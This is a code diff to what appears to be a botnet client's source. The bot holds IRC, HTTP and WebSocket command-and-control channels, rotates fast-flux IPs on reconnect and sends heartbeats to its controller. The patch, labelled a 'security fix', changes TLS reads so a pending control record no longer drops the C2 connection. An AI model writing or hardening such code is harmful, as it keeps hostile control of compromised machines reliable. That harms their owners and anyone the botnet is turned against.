@@ -484,6 +484,10 @@ int irc_read(notnet_bot_t *bot, char *buf, int len) {
      * numerics across reads. */
     char raw[1024];
     int received = chan_recv(&bot->c2_irc.tls, bot->c2_irc.sock, raw, sizeof(raw) - 1);
+    if (received == -2) {
+        /* SECURITY FIX (#121): TLS control record consumed, no app data. */
+        return 0;
+    }
     if (received <= 0) {
         log_info("IRC: connection closed");
         /* SECURITY FIX (#85): advance the flux IP so the reconnect
@@ -976,6 +980,11 @@ int http_read(notnet_bot_t *bot, char *buf, int len) {
     
     int received = chan_recv(&bot->c2_http.tls, bot->c2_http.sock, buf, len);
     log_info("HTTP: http_read recv returned %d", received);
+    if (received == -2) {
+        /* SECURITY FIX (#121): TLS consumed a control record and has no
+         * application data this poll — NOT a dead connection. */
+        return 0;
+    }
     if (received <= 0) {
         log_info("HTTP: connection closed (recv=%d)", received);
         /* SECURITY FIX (#85): advance the flux IP so the reconnect
@@ -1827,6 +1836,10 @@ int ws_read(notnet_bot_t *bot, char *buf, int len) {
     size_t hdr_got = 0;
     while (hdr_got < sizeof(frame_hdr)) {
         ssize_t r = chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)frame_hdr + hdr_got, sizeof(frame_hdr) - hdr_got);
+        if (r == -2) {
+            /* SECURITY FIX (#121): TLS control record consumed, no app data. */
+            return 0;
+        }
         if (r <= 0) {
             /* SECURITY FIX (#85): advance the flux IP so the reconnect
              * targets the next A record. */
@@ -3585,15 +3598,50 @@ int tls_recv(notnet_tls_t *tls, char *buf, int len) {
         return recv(tls->sock, buf, len, 0);
     }
 
-    int received = SSL_read(tls->ssl, buf, len);
-    if (received <= 0) {
+    /* SECURITY FIX (#121): the first read after the handshake often hits
+     * the server's pending control records (e.g. NewSessionTicket):
+     * SSL_read consumes them and returns SSL_ERROR_WANT_READ. The old
+     * code returned -1, the callers treated it as a dead connection,
+     * reconnected, and wedged — the bot never sent its first heartbeat.
+     * SSL_read on a BLOCKING socket never returns WANT_READ (it blocks
+     * internally), so the socket is toggled non-blocking for the read;
+     * on WANT_READ/WANT_WRITE we poll the raw socket briefly and retry,
+     * and if it goes quiet (control records consumed, no application
+     * data this poll) return -2 which the channel read loops treat as
+     * "no data, keep connected". */
+    int fl = fcntl(tls->sock, F_GETFL, 0);
+    fcntl(tls->sock, F_SETFL, fl | O_NONBLOCK);
+
+    for (int attempt = 0; attempt < 5; attempt++) {
+        int received = SSL_read(tls->ssl, buf, len);
+        if (received > 0) {
+            fcntl(tls->sock, F_SETFL, fl);
+            return received;
+        }
         int err = SSL_get_error(tls->ssl, received);
-        if (err != SSL_ERROR_WANT_READ) {
+        if (err == SSL_ERROR_WANT_READ || err == SSL_ERROR_WANT_WRITE) {
+            fcntl(tls->sock, F_SETFL, fl);   /* blocking for the poll */
+            fd_set rfds;
+            FD_ZERO(&rfds);
+            FD_SET(tls->sock, &rfds);
+            struct timeval tv;
+            tv.tv_sec = 0;
+            tv.tv_usec = 200000;   /* 200ms: short poll for more raw data */
+            int sel = select(tls->sock + 1, &rfds, NULL, NULL, &tv);
+            if (sel > 0) {
+                fcntl(tls->sock, F_SETFL, fl | O_NONBLOCK);
+                continue;
+            }
+            return -2;
+        }
+        if (err != SSL_ERROR_ZERO_RETURN) {
             log_warn("TLS: read failed (error %d)", err);
         }
+        fcntl(tls->sock, F_SETFL, fl);
         return -1;
     }
-    return received;
+    fcntl(tls->sock, F_SETFL, fl);
+    return -2;
 }
 
 void tls_close(notnet_tls_t *tls) {
